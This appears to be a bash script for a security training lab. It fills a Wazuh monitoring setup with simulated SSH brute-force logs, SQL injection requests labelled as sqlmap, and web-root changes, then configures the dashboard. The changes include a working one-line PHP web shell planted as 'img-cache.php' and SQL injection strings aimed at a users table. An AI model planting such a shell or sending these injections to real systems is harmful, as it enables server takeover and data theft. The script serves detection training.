#!/usr/bin/env bash
# The shop server "web-01": once per lab start, after the manager is watching, write one burst of
# SSH and web logs and make a few changes in the web root. The same story every time.
set -euo pipefail
umask 022
LOGS=/var/log/lab WEB=/srv/www/html OSSEC=/var/ossec/logs/ossec.log STATE=/feed
RANDOM=2026
[ -f "$STATE/done" ] && exec sleep infinity
# The web root and log files were created by the setup service (certs.sh) before the manager started.

echo "waiting for the manager to watch the logs and finish its first FIM scan..."
until [ -f "$OSSEC" ] && grep -q "Analyzing file: '$LOGS/access.log'" "$OSSEC" \
      && grep -q "File integrity monitoring scan ended" "$OSSEC"; do sleep 5; done
sleep 15

ts() { date '+%b %e %H:%M:%S'; }
web_ts() { date '+%d/%b/%Y:%H:%M:%S +0000'; }
pid=3000
ssh() { pid=$((pid + 1)); printf '%s web-01 sshd[%s]: %s\n' "$(ts)" "$pid" "$1" >> "$LOGS/auth.log"; }
port() { echo $((40000 + RANDOM % 20000)); }

# --- SSH ---
users=(admin test oracle deploy ubuntu git postgres)
for i in $(seq 1 120); do ssh "Invalid user ${users[i % 6]} from 203.0.113.77 port $(port)"; done
for i in $(seq 1 70); do
  if [ $((i % 3)) -eq 0 ]; then u=${users[RANDOM % 7]}; else u=deploy; fi
  ssh "Invalid user $u from 192.0.2.45 port $(port)"
done
for i in $(seq 1 200); do ssh "Failed password for root from 198.51.100.200 port $(port) ssh2"; done
for i in $(seq 1 30); do ssh "Invalid user ${users[RANDOM % 7]} from 198.51.100.23 port $(port)"; done
for i in $(seq 1 6); do ssh "Failed password for jenkins from 198.51.100.23 port $(port) ssh2"; done
ssh "Accepted password for jenkins from 198.51.100.23 port $(port) ssh2"
staff=(maria omar li)
for i in $(seq 1 25); do ssh "Accepted publickey for ${staff[i % 3]} from 10.20.1.$((10 + i % 5)) port $(port) ssh2"; done

# --- web ---
req() { printf '%s - - [%s] "GET %s HTTP/1.1" %s %s "-" "%s"\n' "$1" "$(web_ts)" "$2" "$3" $((200 + RANDOM % 9000)) "$4" >> "$LOGS/access.log"; }
pages=(/ /shop /shop/item?id=12 /shop/item?id=7 /cart /login /assets/app.js)
ua="Mozilla/5.0 (X11; Linux x86_64) Firefox/131.0"
for i in $(seq 1 300); do req "10.20.4.$((20 + RANDOM % 40))" "${pages[RANDOM % 7]}" 200 "$ua"; done
for i in $(seq 1 30); do req "10.20.4.$((20 + RANDOM % 40))" "/shop/item?id=$((900 + i))" 404 "$ua"; done
sqli=("/shop/item?id=12%20UNION%20SELECT%20username,password%20FROM%20users"
      "/shop/item?id=12%20union%20select%201,2,3--"
      "/cart?coupon=x'%20or%201=1;%20select%20*%20from%20orders")
for i in $(seq 1 24); do req 192.0.2.66 "${sqli[i % 3]}" 500 "sqlmap/1.8"; done
for i in $(seq 1 18); do req 192.0.2.66 "${sqli[i % 3]}" 403 "sqlmap/1.8"; done
for i in $(seq 1 3); do req 192.0.2.66 "${sqli[i % 3]}" 200 "sqlmap/1.8"; done
for i in $(seq 1 9); do req 203.0.113.90 "${sqli[i % 3]}" 500 "python-requests/2.32"; done

# --- the web root changes ---
sleep 5
for i in 1 2 3; do printf '$db_pass = "changed-%s";\n' "$i" >> "$WEB/config.php"; sleep 6; done
printf '// session fix\n' >> "$WEB/login.php"; sleep 6
printf '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>\n' > "$WEB/uploads/img-cache.php"
sleep 20

# Discover needs an index pattern; the Wazuh app only creates it on the first browser visit.
DASH=https://wazuh.dashboard:5601 AUTH=admin:Lab-Wazuh-2026
until curl -sk -o /dev/null -f -u "$AUTH" "$DASH/api/status"; do sleep 5; done
curl -sk -u "$AUTH" -H 'osd-xsrf: true' -H 'Content-Type: application/json' -o /dev/null \
  -X POST "$DASH/api/saved_objects/index-pattern/wazuh-alerts-*" \
  -d '{"attributes":{"title":"wazuh-alerts-*","timeFieldName":"timestamp"}}'
curl -sk -u "$AUTH" -H 'osd-xsrf: true' -H 'Content-Type: application/json' -o /dev/null \
  -X POST "$DASH/api/opensearch-dashboards/settings" -d '{"changes":{"defaultIndex":"wazuh-alerts-*"}}'
touch "$STATE/done"
echo "feed complete"
exec sleep infinity
